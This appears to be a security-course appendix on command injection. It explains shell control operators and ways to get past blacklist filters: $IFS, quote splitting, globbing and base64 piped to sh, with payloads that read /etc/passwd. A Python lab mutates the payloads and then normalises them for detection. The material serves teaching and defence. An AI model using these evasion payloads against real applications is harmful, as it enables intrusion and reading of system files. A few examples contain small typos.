## Appendix B: Advanced Command Injection Mechanics & Evasion Frameworks

### 1. Underlying Interpreter Syntax Matrices

Command injection occurs when untrusted user input is passed directly to a system shell interpreter (such as `/bin/sh`, `/bin/bash`, or `cmd.exe`) without proper contextual escaping. The interpreter treats characters within the input payload as structural control operators rather than literal string arguments.

The table below maps standard control operators across target operational environments:

| Control Operator | Linux (Bash / Sh) Behavior | Windows (Cmd.exe) Behavior | Architectural Execution Context |
| --- | --- | --- | --- |
| `;` | **Sequential Execution:** Executes command A, then command B regardless of outcome. | **Syntax Error:** Interpreted as a literal character or invalid syntax parameter. | Independent chained execution. |
| `&` | **Background Execution:** Spawns command A in a background subshell, then immediately runs command B. | **Sequential Execution:** Runs command A, then runs command B sequentially. | Non-blocking execution chains. |
| `&&` | **Conditional AND:** Runs command B *only* if command A terminates with an exit code of `0`. | **Conditional AND:** Runs command B *only* if command A succeeds. | Short-circuit evaluation requiring prior success. |
| `|` | **Pipe Operator:** Routes the standard output (`stdout`) of command A into the standard input (`stdin`) of command B. | **Pipe Operator:** Routes output stream A into input stream B. | Context redirection and processing pipelines. |
| `||` | **Conditional OR:** Runs command B *only* if command A terminates with a non-zero exit code. | **Conditional OR:** Runs command B *only* if command A fails. | Fallback execution logic for error handling. |
| ``` / `$()` | **Inline Subshell:** Executes command inside brackets first; interpolates text output into the outer command line. | **Unsupported:** Treated as literal punctuation marks. | Deep execution nesting and variable expansion. |

---

### 2. Defeating Trivial Blacklists (Bypass Mechanics)

Naively designed security filters often rely on string blacklists to block specific characters or command names (e.g., rejecting inputs containing spaces, semicolons, or the string `cat`). These defensive filters are easily bypassed because shell interpreters provide multiple alternative methods to express the same operational intents.

#### Space Tokenization Overrides

If a web application filter rejects space characters (`0x20`), an engineer can leverage alternative shell syntax structures that force the interpreter to split arguments without spaces:

* **The Internal Field Separator (`$IFS`):** A special environment variable in Bash that defaults to a space, tab, or newline. Writing `cat$IFS/etc/passwd` instructs the shell to expand `$IFS` as a delimiter, evaluating the string exactly as `cat /etc/passwd`.
* **Path Redirection Brackets:** The expression `cat</etc/passwd` uses the input redirection operator `<` to feed the target file directly into the program's input stream, avoiding spaces entirely.
* **Brace Expansion:** Writing `{cat,/etc/passwd}` forces Bash to expand the comma-separated strings inside a localized execution block, executing the binary with the provided arguments.

#### Component Obfuscation & Character Reassembly

If a signature-based detection system alerts on explicit command strings like `cat` or `id`, the payload can be broken down using native shell manipulation features to evade simple text matching:

* **Single/Double Quote Interpolation:** The shell strips quotes *after* evaluation but *before* binary execution. Therefore, `c'a't /et'c'/pas's'wd` bypasses string match checks for `cat` while executing identically to the plaintext command.
* **Wildcard Expansion (Globbing):** Instead of calling a binary explicitly, wildcards allow the shell to resolve the path dynamically. For example, `/bin/c?t /etc/pa??wd` expands automatically to `/bin/cat /etc/passwd`.
* **Dynamic Concatenation:** Using local shell variables allows string reassembly at runtime:
```bash
A=ca; B=t; $A$B /etc/passwd

```


* **Base64 Decoding Pipelines:** The entire payload can be encoded as an alphanumeric string, removing all suspicious characters, and decoded on the fly before being passed to an interpreter:
```bash
echoY2F0IC9ldGMvcGFzc3dk | base64 -d | sh

```



---

### 3. Automated Obfuscation & Normalization Labs

To understand these evasion mechanics deeply, security engineers must analyze how obfuscated inputs map back to their original forms. Below is a complete implementation of an interactive evaluation lab. It includes an automated obfuscation engine that generates mutated strings and a defensive normalization engine that cleans and decodes input strings to expose the true underlying command intent before it ever reaches an execution wrapper.

#### `scripts/module4/obfuscation_lab.py`

```python
"""
obfuscation_lab.py
A simulation lab demonstrating offensive command obfuscation techniques
and defensive normalization pipelines for robust input inspection.
"""

import base64
import re
from typing import Dict, Any


class ObfuscationEngine:
    """Generates complex, obfuscated variants of basic system commands to test filter resiliency."""

    @staticmethod
    def apply_ifs_obfuscation(command: str) -> str:
        """Replaces standard space formatting blocks with Internal Field Separator variables."""
        return command.replace(" ", "$IFS")

    @staticmethod
    def apply_quote_injection(command: str) -> str:
        """Injects neutral quote literals into the command path string to break signature matches."""
        if len(command) > 3:
            # Inject quotes into the second character slot: e.g., ca't
            return command[0] + "''" + command[1:]
        return command

    @staticmethod
    def apply_base64_wrapper(command: str) -> str:
        """Wraps the entire target command string inside a base64 shell pipeline structure."""
        encoded_bytes = base64.b64encode(command.encode("utf-8"))
        encoded_str = encoded_bytes.decode("utf-8")
        return f"echo {encoded_str} | base64 -d | sh"


class NormalizationEngine:
    """Defensively parses, de-obfuscates, and normalizes inputs to expose hidden command intents."""

    @staticmethod
    def normalize_input(raw_input: str) -> str:
        """Applies sequence cleaning stages to transform obfuscated data into standard text formats."""
        cleaned = raw_input.strip()

        # Stage 1: Check for and resolve Base64 pipeline encapsulation
        # Regex looks for base64 decoding patterns (e.g., echo ... | base64 -d)
        b64_match = re.search(r"echo\s+([A-Za-z0-9+/=]+)\s*\|\s*base64\s+-d", cleaned, re.IGNORECASE)
        if b64_match:
            try:
                extracted_b64 = b64_match.group(1)
                decoded_bytes = base64.b64decode(extracted_b64)
                cleaned = decoded_bytes.decode("utf-8", errors="ignore")
            except Exception:
                pass  # Fall back to existing state if decoding fails

        # Stage 2: Remove single and double quotes used for signature evasion
        cleaned = cleaned.replace("'", "").replace('"', "")

        # Stage 3: Normalize Internal Field Separator tokens back into readable spaces
        cleaned = cleaned.replace("$IFS", " ")

        # Stage 4: Deduplicate redundant whitespace pools
        cleaned = re.sub(r"\s+", " ", cleaned)

        return cleaned.strip()


def run_lab_simulation() -> None:
    """Executes the test lifecycle, passing payloads through the obfuscation and normalization loops."""
    target_command = "cat /etc/passwd"
    print(f"[LAB START] Original Command Intent: '{target_command}'\n")

    # Generate mutations using the obfuscation engine
    payloads: Dict[str, str] = {
        "IFS Delimitation": ObfuscationEngine.apply_ifs_obfuscation(target_command),
        "Quote Fragmentation": ObfuscationEngine.apply_quote_injection(target_command),
        "Base64 Encapsulation": ObfuscationEngine.apply_base64_wrapper(target_command),
    }

    print("--- Offensive Mutation Phase ---")
    for technique, payload in payloads.items():
        print(f"  [+] {technique:<22} ->  {payload}")

    print("\n--- Defensive Normalization Phase ---")
    for technique, payload in payloads.items():
        normalized = NormalizationEngine.normalize_input(payload)
        is_matched = (normalized == target_command)
        print(f"  [*] Processing {technique:<18} Input String...")
        print(f"      Normalized Result : '{normalized}'")
        print(f"      Intent Restored   : {is_matched}\n")


if __name__ == "__main__":
    run_lab_simulation()

```

### 4. Verification & Output Metrics

Execute the laboratory script via the terminal to confirm operational outcomes:

```bash
python3 scripts/module4/obfuscation_lab.py

```

**Expected Diagnostic Report:**

```
[LAB START] Original Command Intent: 'cat /etc/passwd'

--- Offensive Mutation Phase ---
  [+] IFS Delimitation     ->  cat$IFS/etc/passwd
  [+] Quote Fragmentation   ->  c''at /etc/passwd
  [+] Base64 Encapsulation ->  echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh

--- Defensive Normalization Phase ---
  [*] Processing IFS Delimitation   Input String...
      Normalized Result : 'cat /etc/passwd'
      Intent Restored   : True

  [*] Processing Quote Fragmentation Input String...
      Normalized Result : 'cat /etc/passwd'
      Intent Restored   : True

  [*] Processing Base64 Encapsulation Input String...
      Normalized Result : 'cat /etc/passwd'
      Intent Restored   : True

```


